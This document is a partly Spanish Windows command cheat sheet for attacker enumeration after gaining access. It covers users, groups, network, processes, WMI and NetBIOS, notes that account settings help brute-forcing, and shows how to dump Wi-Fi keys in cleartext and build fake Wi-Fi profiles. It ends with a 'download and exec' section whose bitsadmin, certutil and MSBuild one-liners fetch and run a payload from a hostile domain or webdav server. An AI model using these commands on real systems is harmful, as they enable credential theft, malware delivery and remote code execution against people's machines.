#www.youtube.com/loveisinthenet @j0moz4
#COMANDOS DE LISTADO DE DIRECTORIOS:
dir, tree, find
dir /a
dir /s *[term]*
dir /adir /s *[term]*
tree C:
 /f /a > C:
output_of_tree.txt
[somecommand] \| find /c /v ”[searchstring]”

#Environment Variables
set

#User Enumeration
#Get current username
echo %USERNAME% || whoami
##List all users
net user
whoami /all
##List logon requirements; useable for bruteforcing
net accounts
#Get details about a user (i.e. administrator, admin, current user)
net user administrator
net user admin
net user %USERNAME%
##List all local groups
net localgroup
#Get details about a group (i.e. administrators)
net localgroup administrators

#Network Enumeration#
#List all network interfaces
ipconfig /all#
#List current routing table
route print#
#List the ARP table
arp -A#
#List all current connections
netstat -ano

#Processes Enum
tasklist /v
tasklist /v /fi "username eq system"

#NET COMMAND  - comando ver info de redes
#No mbre Dominio:
net ACCOUNTS /DOMAIN
net view *share*
#Recursos compartidos:
net share
#UserInfo:
net user %USERNAME% [/domain]
#Info grupo local:
net localgroup

#NETSH COMMAND - consola configuracion de red
#Ver configuracion del fierwal:
netsh firewall show conf

#NETSH & WIRELESS:
#Informacion de los adaptadores wireless:
netsh WLAN show wirelesscapabilities
#Informacion drivers antenas:
netsh WLAN show drivers
#Informaion interfaces de red:
netsh WLAN show interfaces
#Ver perfiles wifi:
netsh WLAN show profile
netsh wlan export profile key=clear
#Sacar perfiles wifi en un xml=
netsh wlan export profile folder=. key=clear
#A partir del XML podriamos crear un perfil wifi FALSO
Netsh WLAN add profile filename="File_Path.XML"Q
#Crear informe de stados de las conexiones innalambricas:
Netsh WLAN show WLANreport

netsh trace start capture=yes Ethernet.Type=IPv4  IPv4.Address=<IP> Protocol=TCP persistent=yes traceFile=C:\trace.etl
netsh trace stop

#Command with arguments:
#Find Information about a specific Service

#Muestra todas las conexiones y puertos a la escucha.
netstat -na | findstr :80
#Muestra las aplicaciones y archivos ejecutables involucrados en crear conexiones en los puertos a la escucha.
netstat -nao | findstr /I listening
#Muestra los puertos y las direcciones en formato numérico.
netstat -nabo
#Permite ver la identidad de cada proceso (PID) involucrado.
netstat -r ROUTING TABLE

#WMI COMMAND - windows management instrumentation
#Establecer normas estándar para tener acceso y compartir la información de administración a través de la red

#Get BIOS Info:
wmic bios
#Get DISK INFO:
wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber
Create process:
wmic process call create [EXECUTABLE]
#Get Process:
wmic process get caption,executablepath,commandline
Kill Process:
wmic process where name="[PROCESS]" call terminate
#Get Services:
wmic service [list full]
#Get Shared Files:
wmic share [list brief]
#Get AutoStarts:
wmic startup [list brief]
#Get USers:
wmic useraccount [list full]
#Get OS Arch (32/64) wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
#Get discs lettters:
wmic logicaldisk get caption || fsutil fsinfo drives
#Get domain if exist:
wmic ntdomain list

#netbios - servicio de gestion de redes de equipos
#NetBIOS:
nbtstat
# Listening NETBIOS Services on A Remote Machine
#Command with arguments:
nbtstat -A 42.200.150.157

#dowload and exec
bitsadmin /transfer mydownloadjob /download /priority normal http:/baddomain.pw 
C:\\Users\\%USERNAME%\\AppData\\local\\temp\\malware.exe
certutil -urlcache -split -f http:/webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
cmd /V /c "set MB="C:Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"

